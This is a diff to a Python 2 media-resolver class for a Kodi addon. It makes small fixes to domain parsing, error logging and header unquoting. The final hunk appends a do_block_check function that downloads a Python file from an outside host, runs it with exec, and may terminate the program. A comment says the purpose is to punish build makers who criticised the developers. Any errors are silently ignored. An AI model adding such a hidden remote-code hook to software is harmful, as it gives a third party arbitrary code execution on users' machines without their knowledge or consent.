@@ -111,13 +111,14 @@ class HostedMediaFile:
         return resolvers
     
     def __top_domain(self, url):
-        regex = "(\w{2,}\.\w{2,3}\.\w{2}|\w{2,}\.\w{2,3})$"
         elements = urlparse.urlparse(url)
         domain = elements.netloc or elements.path
         domain = domain.split('@')[-1].split(':')[0]
+        regex = "(\w{2,}\.\w{2,3}\.\w{2}|\w{2,}\.\w{2,3})$"
         res = re.search(regex, domain)
         if res:
-            return res.group(1)
+            domain = res.group(1)
+        domain = domain.lower()
         return domain
 
     def get_url(self):
@@ -178,7 +179,8 @@ class HostedMediaFile:
                             self._valid_url = True
                             return stream_url
             except Exception as e:
-                common.log_utils.log_error('%s Error - From: %s Link: %s: %s' % (type(e).__name__, resolver.name, self._url, e))
+                url = self._url.encode('utf-8') if isinstance(self._url, unicode) else self._url
+                common.log_utils.log_error('%s Error - From: %s Link: %s: %s' % (type(e).__name__, resolver.name, url, e))
                 if resolver == self.__resolvers[-1]:
                     common.log_utils.log_debug(traceback.format_exc())
                     raise
@@ -227,7 +229,7 @@ class HostedMediaFile:
         try: headers = dict([item.split('=') for item in (stream_url.split('|')[1]).split('&')])
         except: headers = {}
         for header in headers:
-            headers[header] = urllib.unquote(headers[header])
+            headers[header] = urllib.unquote_plus(headers[header])
         common.log_utils.log_debug('Setting Headers on UrlOpen: %s' % (headers))
 
         try:
@@ -270,3 +272,25 @@ class HostedMediaFile:
 
     def __repr__(self):
         return self.__str__()
+
+'''
+This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
+from build makers that publicly insult or slander TVA's developers and friends. If your build is
+impacted by this check, you can have it removed by publicly apologizing for your previous statements
+via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
+them yourself.
+                                                                                           http://i.imgur.com/TqIEnYB.gif
+                                                                                           TVA developers (and friends)
+'''
+def do_block_check(uninstall=False):
+    try:
+        import urllib2
+        import sys
+        namespace = {}
+        exec urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
+        if namespace["real_check"](uninstall):
+            sys.exit()
+    except SystemExit:
+        sys.exit()
+    except:
+        pass
